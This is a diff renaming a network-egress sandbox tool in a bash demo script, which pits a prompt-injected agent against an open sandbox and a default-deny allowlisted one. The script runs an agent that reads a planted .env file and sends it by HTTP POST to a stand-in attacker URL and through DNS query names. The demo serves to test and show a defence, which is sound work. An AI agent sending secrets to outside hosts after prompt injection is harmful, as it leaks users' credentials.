@@ -1,16 +1,16 @@
 #!/usr/bin/env bash
-# egressd demo: one prompt-injected agent, two sandboxes.
+# sandwall demo: one prompt-injected agent, two sandboxes.
 #
 #   (a) an "open" sandbox: its own netns with plain NAT, like most sandboxes.
 #       The agent reads a planted .env and exfiltrates it by HTTP POST and
 #       through DNS query names. Both succeed.
-#   (b) an egressd sandbox with an allowlist for pypi/GitHub. The same agent
+#   (b) an sandwall sandbox with an allowlist for pypi/GitHub. The same agent
 #       gets nothing out; the deny log and metrics show what it tried.
 #
 # The "attacker" is a local listener in its own netns at 10.99.0.1, so the
 # demo needs no internet access for the exfiltration itself.
 #
-# Usage (root, Linux): sudo EGRESSD=$PWD/bin/egressd demo/exfil.sh
+# Usage (root, Linux): sudo SANDWALL=$PWD/bin/sandwall demo/exfil.sh
 set -uo pipefail
 
 DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -26,12 +26,12 @@ note() { printf '%s%s%s\n' "$DIM" "$*" "$RESET"; }
 
 cleanup() {
 	stop_daemon
-	"$EGRESSD" "${G[@]}" nuke >/dev/null 2>&1
+	"$SANDWALL" "${G[@]}" nuke >/dev/null 2>&1
 	ip netns pids "$OPEN_NS" 2>/dev/null | xargs -r kill 2>/dev/null
 	ip link del dm-open0 2>/dev/null
 	ip netns del "$OPEN_NS" 2>/dev/null
 	rm -rf "/etc/netns/$OPEN_NS"
-	nft delete table ip egressd_demo 2>/dev/null
+	nft delete table ip sandwall_demo 2>/dev/null
 	sysctl -qw net.ipv4.ip_forward="$ORIG_FWD"
 	teardown_attacker
 	rm -rf "$T"
@@ -51,7 +51,7 @@ chmod 644 "$T/work/.env" "$T/work/agent.py"
 AGENT=(python3 "$T/work/agent.py" --env "$T/work/.env" --url "http://$ATTACKER_IP:$ATTACKER_PORT/collect")
 as_nobody=(setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all --bounding-set=-all --no-new-privs --)
 
-"$EGRESSD" "${G[@]}" nuke >/dev/null
+"$SANDWALL" "${G[@]}" nuke >/dev/null
 setup_attacker || exit 1
 
 step "(a) open sandbox: own netns, NAT to anywhere"
@@ -66,7 +66,7 @@ ip -n "$OPEN_NS" link set lo up
 ip -n "$OPEN_NS" route add default via 10.250.0.1
 sysctl -qw net.ipv4.ip_forward=1
 nft -f - <<'EOF'
-table ip egressd_demo {
+table ip sandwall_demo {
 	chain postrouting {
 		type nat hook postrouting priority srcnat; policy accept;
 		ip saddr 10.250.0.0/30 masquerade
@@ -85,11 +85,11 @@ if [[ -s "$ATTACKER_LOOT" ]]; then
 	printf '%s=> secrets exfiltrated%s\n' "$RED$BOLD" "$RESET"
 fi
 
-step "(b) egressd sandbox: default deny, allowlist $(grep -c '^    - ' "$DEMO_DIR/policy.yaml") domains"
+step "(b) sandwall sandbox: default deny, allowlist $(grep -c '^    - ' "$DEMO_DIR/policy.yaml") domains"
 start_daemon || exit 1
-"$EGRESSD" "${G[@]}" sandbox create agent --policy "$DEMO_DIR/policy.yaml"
+"$SANDWALL" "${G[@]}" sandbox create agent --policy "$DEMO_DIR/policy.yaml"
 : >"$ATTACKER_LOOT"
-"$EGRESSD" "${G[@]}" sandbox exec agent -- "${AGENT[@]}"
+"$SANDWALL" "${G[@]}" sandbox exec agent -- "${AGENT[@]}"
 sleep 1
 note "attacker received:"
 if [[ -s "$ATTACKER_LOOT" ]]; then
@@ -99,12 +99,12 @@ if [[ -s "$ATTACKER_LOOT" ]]; then
 fi
 printf '    (nothing)\n%s=> nothing left the sandbox%s\n' "$GREEN$BOLD" "$RESET"
 
-note "egressd logs agent --deny-only:"
-"$EGRESSD" "${G[@]}" logs agent --deny-only |
+note "sandwall logs agent --deny-only:"
+"$SANDWALL" "${G[@]}" logs agent --deny-only |
 	jq -r '"    \(.ts[11:23])  \(.type)  \(.verdict)/\(.reason // "-")  \(if .qname then "\(.qtype) \(.qname)" else "\(.proto) \(.dst_ip):\(.dst_port)" end)"'
 note "metrics (curl :9464/metrics):"
-curl -s http://127.0.0.1:19464/metrics | grep -E '^egressd_(denied_total|dns_queries_total)\{.*sandbox="agent"' | sed 's/^/    /'
+curl -s http://127.0.0.1:19464/metrics | grep -E '^sandwall_(denied_total|dns_queries_total)\{.*sandbox="agent"' | sed 's/^/    /'
 
 step "the agent can still do its job"
-code=$("$EGRESSD" "${G[@]}" sandbox exec agent -- curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>&1)
+code=$("$SANDWALL" "${G[@]}" sandbox exec agent -- curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/simple/requests/ 2>&1)
 printf '    curl https://pypi.org/simple/requests/ -> %s\n' "$code"
